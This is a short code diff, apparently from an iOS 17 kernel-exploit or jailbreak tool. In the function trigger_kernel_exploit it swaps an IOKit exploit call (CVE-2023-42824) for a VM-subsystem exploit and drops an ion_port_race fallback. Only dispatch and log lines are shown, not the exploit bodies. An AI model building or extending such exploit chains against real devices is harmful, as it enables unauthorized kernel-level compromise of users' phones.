@@ -252,8 +252,8 @@ bool trigger_kernel_exploit(void) {
     
     // 不同版本尝试不同的方法
     if (majorVersion == 17 && minorVersion >= 6) {
-        if (exploit_iokit_cve_2023_42824()) {
-            NSLog(@"[+] iOS 17.6 IOKit漏洞成功");
+        if (exploit_vm_subsystem_vulnerabilities()) {
+            NSLog(@"[+] iOS 17.6 VM子系统漏洞成功");
             g_has_kernel_access = true;
             return true;
         }
@@ -261,16 +261,6 @@ bool trigger_kernel_exploit(void) {
     
     if (exploit_method_ios17_specific()) {
         NSLog(@"[+] iOS 17通用漏洞成功");
-        g_has_kernel_access = true;
-        return true;
-    }
-    
-    // 尝试其他方法
-    bool success = false;
-    
-    success = exploit_method_ion_port_race();
-    if (success) {
-        NSLog(@"[+] ion_port_race漏洞成功");
         g_has_kernel_access = true;
         return true;
     }
